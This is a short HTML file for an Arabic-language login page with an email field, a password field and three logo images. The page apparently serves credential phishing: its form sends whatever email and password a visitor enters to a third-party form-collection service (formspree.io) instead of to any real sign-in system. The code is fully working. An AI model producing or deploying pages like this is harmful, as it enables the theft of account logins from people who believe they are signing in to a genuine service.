<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            margin: 0;
            height: 100vh; /* 100% من ارتفاع الصفحة */
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
        }

        .form-container {
            max-width: 400px;
            width: 100%; /* العرض يأخذ 100% مع الحد الأقصى 400px */
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            background-color: #fff;
            text-align: center;
        }

        .images-container {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .images-container img {
            width: 80px; /* يمكنك تعديل الحجم حسب الحاجة */
            height: 80px;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #45a049;
        }

        /* Media Queries للتوافق مع الهواتف */
        @media (max-width: 600px) {
            .images-container {
                flex-direction: column;
                gap: 10px;
            }

            .images-container img {
                width: 60px; /* تصغير الصور في الشاشات الصغيرة */
                height: 60px;
            }

            .form-container {
                padding: 15px;
                width: 90%; /* العرض في الشاشات الصغيرة */
            }
        }
    </style>
</head>
<body>

    <div class="form-container">
        <!-- إضافة ثلاث صور مع التحكم بحجمها -->
        <div class="images-container">
            <img src="logo.png" alt="Image 1" style="width: 80px; height: 80px;">
            <img src="broken-link.png" alt="Image 2" style="width: 50px; height: 50px; margin-left: -10px; padding: 10px 10px;">
            <img src="groob.png" alt="Image 3" style="width: 120px; height: 120px;">
        </div>

        <h2>تسجيل الدخول</h2>
        <form action="https://formspree.io/f/mvgoabaz" method="POST">
            <input class="input-field" type="email" name="email" placeholder="أدخل بريدك الإلكتروني" required>
            <input class="input-field" type="password" name="password" placeholder="أدخل كلمة السر" required>
            <button type="submit" class="submit-btn">تسجيل الدخول</button>
        </form>
    </div>

</body>
</html>
